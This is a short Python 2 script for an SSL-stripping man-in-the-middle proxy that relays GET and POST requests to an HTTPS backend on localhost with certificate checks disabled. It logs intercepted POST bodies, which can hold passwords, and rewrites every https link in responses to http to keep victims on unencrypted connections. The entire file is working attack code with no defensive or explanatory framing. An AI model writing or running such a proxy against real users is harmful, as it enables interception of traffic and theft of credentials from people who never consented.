import BaseHTTPServer
import SocketServer
import ssl
import urllib2

class SSLStripProxy(BaseHTTPServer.BaseHTTPRequestHandler):
    def do_GET(self):
        target_host = self.headers.get('Host')
        url = 'https://localhost:4443' + self.path

        print("Intercepted GET request %s" % (url))

        try:
            req = urllib2.Request(url)
            for k in self.headers:
                req.add_header(k, self.headers[k])
            context = ssl._create_unverified_context()
            response = urllib2.urlopen(req, context=context)
            content = response.read()

            # Rewrite links from https to http
            content = content.replace('https://', 'http://')
            self.send_response(200)
            self.send_header('Content-type', response.info().getheader('Content-Type'))
            self.end_headers()
            self.wfile.write(content)
        except Exception as e:
            self.send_error(502, 'Bad gateway: {}'.format(e))

    def do_POST(self):
        target_host = self.headers.get('Host')
        url = 'https://localhost:4443' + self.path
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)

        print("Intercepted POST request %s: %s" % (url, post_data))

        try:
            req = urllib2.Request(url, data=post_data)
            for k in self.headers:
                req.add_header(k, self.headers[k])
            context = ssl._create_unverified_context()
            response = urllib2.urlopen(req, context=context)
            content = response.read()

            # Rewrite links again
            content = content.replace('https://', 'http://')
            self.send_response(200)
            self.send_header('Content-type', response.info().getheader('Content-Type'))
            self.end_headers()
            self.wfile.write(content)
        except Exception as e:
            self.send_error(502, 'Bad gateway: {}'.format(e))

httpd = SocketServer.TCPServer(("", 8080), SSLStripProxy)
print("SSL Strip Proxy running on port %d..." % 8080)
httpd.serve_forever()
